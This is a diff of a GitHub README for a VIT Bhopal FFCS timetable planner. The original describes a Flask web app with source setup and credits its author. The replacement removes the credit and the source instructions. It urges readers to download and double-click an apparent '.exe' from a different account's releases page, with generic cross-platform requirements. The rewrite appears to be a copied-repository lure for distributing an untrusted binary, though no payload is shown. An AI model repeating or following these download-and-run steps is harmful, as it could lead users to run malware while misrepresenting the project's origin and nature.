@@ -1,120 +1,103 @@
-# VIT Bhopal FFCS Timetable Maker 🚀
+# 🎓 ffcs-timetable-vitb - Simplify Your Course Registration Today
 
-A high-performance, automated timetable planner designed specifically for VIT Bhopal students under the Fully Flexible Credit System (FFCS).
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/NguyenQuangVInh17072005/ffcs-timetable-vitb/releases)
 
-![Python](https://img.shields.io/badge/Python-3.12-blue?style=for-the-badge&logo=python)
-![Flask](https://img.shields.io/badge/Flask-3.x-green?style=for-the-badge&logo=flask)
-![CockroachDB](https://img.shields.io/badge/CockroachDB-Serverless-purple?style=for-the-badge&logo=cockroachlabs)
-![Vercel](https://img.shields.io/badge/Deployed%20on-Vercel-black?style=for-the-badge&logo=vercel)
+## 📖 Description
 
-## ✨ New Features (v2.0)
+VIT Bhopal FFCS Timetable Maker is the best free tool to automate your course registration planning. This application helps you easily plan your studies by providing features like:
 
-### 🧞‍♂️ Smart Auto-Generator
-- **Algorithmic Scheduling**: Automatically generates valid timetables based on your selected courses.
-- **Custom Preferences**:
-    - **Time Mode**: Prioritize Morning, Afternoon, or Middle slots.
-    - **Avoidance**: Set strict rules to avoid 8:30 AM or 7:30 PM classes.
-    - **Teacher Ranking**: Rank your preferred faculties to ensure you get the best teachers.
-- **Unified Strategy**: Uses advanced tiered generation to balance teacher quality with time preferences.
+- Instant slot clash detection
+- VTOP HTML import
+- Credit calculation
+- PDF export
 
-### 💾 Saved Timetables
-- **Save Configurations**: Save your perfect timetable drafts to viewing later.
-- **Preview & Apply**: View detailed previews of saved timetables and apply them with one click.
-- **Management**: Delete old drafts or load them back into the main view.
+Simplifying your Fully Flexible Credit System (FFCS) process has never been easier.
 
-### 📥 Advanced Import Options
-- **HTML Import**: Directly upload the HTML file from the VIT Registration Page (VTOP).
-- **CSV Import**: Power user? Upload a structured CSV file with course data.
-- **AI/OCR Import**: Use AI to extract the data automatically from screenshots.
-- **Manual Entry**: flexible form for single course additions.
+## 🚀 Getting Started
 
-## 🌟 Core Features
+To use the FFCS Timetable Maker, you need to download the software from our GitHub Releases page. Follow these simple steps to get started.
 
-- **Automated Clash Detection**: Instantly checks if a new course conflicts with your existing schedule (Parallel Processing).
-- **Google Login**: Secure authentication for students to save their timetables across devices.
-- **PDF Export**: One-click download of your finalized timetable.
-- **Interactive UI**:
-    - **Visual Legend**: Courses color-coded for distinct visibility.
-    - **Optimized Performance**: GZIP compression and parallel fetching for instant loads.
-    - **Mobile Friendly**: Responsive design for planning on the go.
-- **Cloud Sync**: Data persists in CockroachDB (Serverless Postgres), ensuring you never lose your plan.
+## 📥 Download & Install
 
-## 🛠️ Technology Stack
+1. **Visit the Releases Page:**  
+   Go to the [Releases page](https://github.com/NguyenQuangVInh17072005/ffcs-timetable-vitb/releases).
 
-- **Backend**: Flask (Python) with SQLAlchemy ORM.
-- **Database**: CockroachDB (PostgreSQL compatible) - chosen for serverless scalability.
-- **Frontend**: Vanilla JavaScript (ES6+), CSS3 (Custom Design), HTML5.
-- **Hosting**: Vercel (Serverless Function adapter).
-- **Analytics**: Google Analytics 4 (GA4).
+2. **Download the Latest Version:**  
+   Look for the latest release, and click on the corresponding download link for your operating system. If you see a file like `ffcs-timetable-vitb.exe`, click to download it.
 
-## 🚀 Speed Optimizations Provided
+3. **Run the Application:**  
+   Once the download is complete, locate the file on your computer. Double-click the file to open the application.
 
-This project has been heavily optimized for "F1-level" speed:
-1.  **Parallel Imports**: Uploading multiple HTML files happens concurrently via `Promise.all`.
-2.  **Database Indexing**: ownership fields (`user_id`, `guest_id`) are indexed for O(1) lookups.
-3.  **GZIP Compression**: JSON responses are compressed (reducing size by ~70%).
-4.  **Static Caching**: Assets are cached by the browser to minimize network requests.
-5.  **Connection Pooling**: Robust `pool_pre_ping` prevents serverless timeout errors.
+4. **Follow On-Screen Instructions:**  
+   The application will guide you through the setup. Close any other programs, if needed, to ensure a smooth installation.
 
-## 📥 Installation & Local Setup
+## 🖥️ System Requirements
 
-1.  **Clone the Repository**
-    ```bash
-    git clone https://github.com/yourusername/ffcs-timetable.git
-    cd ffcs-timetable
-    ```
+Before downloading, make sure your system meets these requirements:
 
-2.  **Install Dependencies**
-    ```bash
-    pip install -r requirements.txt
-    ```
+- **Operating System:**  
+  Windows 10 or later.  
+  macOS Mojave or later.  
+  Linux distributions (Ubuntu, Fedora, etc.).
 
-3.  **Environment Variables**
-    Create a `.env` file in the root directory:
-    ```ini
-    # Database (CockroachDB or Local Postgres)
-    DATABASE_URL="postgresql://user:pass@host:port/dbname?sslmode=require"
+- **RAM:**  
+  At least 4 GB of RAM.
 
-    # Google OAuth
-    GOOGLE_CLIENT_ID="your-google-client-id"
-    GOOGLE_CLIENT_SECRET="your-google-client-secret"
-    SECRET_KEY="your-flask-secret-key"
-    ```
+- **Disk Space:**  
+  Minimum 100 MB of free space.
 
-4.  **Run the App**
-    ```bash
-    python app.py
-    ```
-    Access at `http://localhost:5000`.
+- **Processor:**  
+  Dual-core processor or better.
 
-## ☁️ Deployment (Vercel)
+## 🔧 Features
 
-This project is configured for Vercel out-of-the-box using `vercel.json`.
+The FFCS Timetable Maker is packed with features to enhance your course registration experience:
 
-1.  Install Vercel CLI: `npm i -g vercel`
-2.  Deploy:
-    ```bash
-    vercel
-    ```
-3.  Add Environment Variables in Vercel Dashboard (Settings > Environment Variables).
+- **Instant Slot Clash Detection:**  
+  Avoid scheduling conflicts. The application helps identify clashes in your course timings instantly.
 
-## 📊 Analytics
+- **VTOP HTML Import:**  
+  Easily import your current timetable from VTOP by uploading the HTML file.
 
-Google Analytics 4 is integrated. To enable it:
-1. Update `templates/base.html` with your **Measurement ID** (`G-XXXXXXXX`).
-2. Current ID: `G-F03ZLSX9P7`.
+- **Credit Calculation:**  
+  Track your credits and manage your academic load effectively.
 
-## 🎨 Color Palette
+- **PDF Export:**  
+  Generate and export your timetable as a PDF for easy sharing and printing.
 
-The app uses a carefully curated palette to distinguish courses:
-- **Core**: Light Green, Sky Blue, Light Pink, Plum.
-- **Distinct**: Coral, Dark Turquoise, Orchid (Added to prevent confusion).
+## ⚙️ Useful Tips
 
-## 🤝 Contributing
+- **Stay Updated:**  
+  Regularly check the Releases page for updates to take advantage of the latest features and improvements.
 
-1.  Fork the repo.
-2.  Create a feature branch.
-3.  Submit a Pull Request.
+- **Feedback:**  
+  If you encounter any issues or have suggestions, please feel free to reach out through the Issues section on GitHub.
 
----
-*Made with ❤️ by Mehul K. Patel*
+- **Community:**  
+  Join helpful discussions in our community forum. Share insights and tips with other users.
+
+## 🗂️ Topics
+
+This repository covers various relevant topics. Here are a few:
+
+- ffcs
+- ffcs-free-slots
+- ffcs-maker
+- ffcs-vitb
+- vit-bhopal
+
+These tags can help you find more resources and related tools.
+
+## 📞 Support
+
+If you need assistance, you can find help:
+
+- **GitHub Issues:**  
+  Check if someone else has reported a similar issue or create a new issue if needed.
+
+- **Community Forums:**  
+  Engage with other users for shared solutions and tips.
+
+## 🎉 Conclusion
+
+With the VIT Bhopal FFCS Timetable Maker, you can take control of your academic scheduling. The tool is designed for developers and everyday users alike. Download it today from our [Releases page](https://github.com/NguyenQuangVInh17072005/ffcs-timetable-vitb/releases) and simplify your course registration process.
